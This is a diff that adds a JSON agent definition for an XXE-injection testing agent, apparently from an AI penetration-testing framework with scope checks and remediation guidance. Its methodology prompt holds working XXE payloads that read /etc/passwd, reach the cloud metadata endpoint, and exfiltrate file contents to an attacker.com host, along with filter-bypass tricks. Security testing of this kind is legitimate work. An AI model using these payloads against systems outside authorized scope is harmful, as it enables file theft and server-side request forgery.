@@ -1,0 +1,34 @@
+{
+  "schema_version": 1,
+  "id": "vulns/xxe",
+  "version": "1.0.0",
+  "title": "XXE Injection Specialist Agent",
+  "category": "vulns",
+  "modes": [
+    "blackbox",
+    "greybox"
+  ],
+  "cwe": [
+    "CWE-611"
+  ],
+  "owasp": [],
+  "mitre": [],
+  "preconditions": [
+    "Operator scope and runtime capability checks pass"
+  ],
+  "required_observations": [],
+  "permitted_tools": [
+    "http_get",
+    "dns_resolve",
+    "tcp_connect"
+  ],
+  "risk_class": "read_only",
+  "methodology": "# XXE Injection Specialist Agent\n## User Prompt\nYou are testing **{target}** for XML External Entity (XXE) Injection.\n**Recon Context:**\n{recon_json}\n**METHODOLOGY:**\n### 1. Identify XML Endpoints\n- Content-Type: application/xml, text/xml\n- SOAP endpoints, SVG upload, DOCX/XLSX upload, RSS/Atom feeds\n- Change Content-Type to XML on JSON endpoints to test parser fallback\n### 2. XXE Payloads\n**File Read:**\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n```\n**SSRF via XXE:**\n```xml\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]>\n```\n**Blind XXE (OOB):**\n```xml\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]>\n```\n**Parameter Entity:**\n```xml\n<!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>\">%eval;%exfil;]>\n```\n### 3. Bypass Filters\n- CDATA: `<![CDATA[<!DOCTYPE...]]>`\n- Encoding: UTF-7, UTF-16\n- XInclude: `<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" parse=\"text\" href=\"file:///etc/passwd\"/>`\n### 4. Report\n```\nFINDING:\n- Title: XXE Injection at [endpoint]\n- Severity: High\n- CWE: CWE-611\n- Endpoint: [URL]\n- Payload: [XML payload]\n- Evidence: [file contents or SSRF response]\n- Impact: File read, SSRF, DoS (billion laughs), port scanning\n- Remediation: Disable external entities, disable DTD processing\n```\n## System Prompt\nYou are an XXE specialist. XXE requires the server to parse XML with external entity processing enabled. Proof is file contents or SSRF response from entity expansion. If the server doesn't accept XML or disables DTD, there's no XXE.\n",
+  "validation_procedure": "Submit candidates referencing actual runtime receipts; harness independently replays supported proofs. Unsupported claims require review.",
+  "stopping_conditions": [
+    "Scope rejection, depleted budget, cancellation, or missing permitted capability"
+  ],
+  "output_schema": "candidate/v1",
+  "imported_from": "vulns/xxe.md",
+  "warnings": []
+}
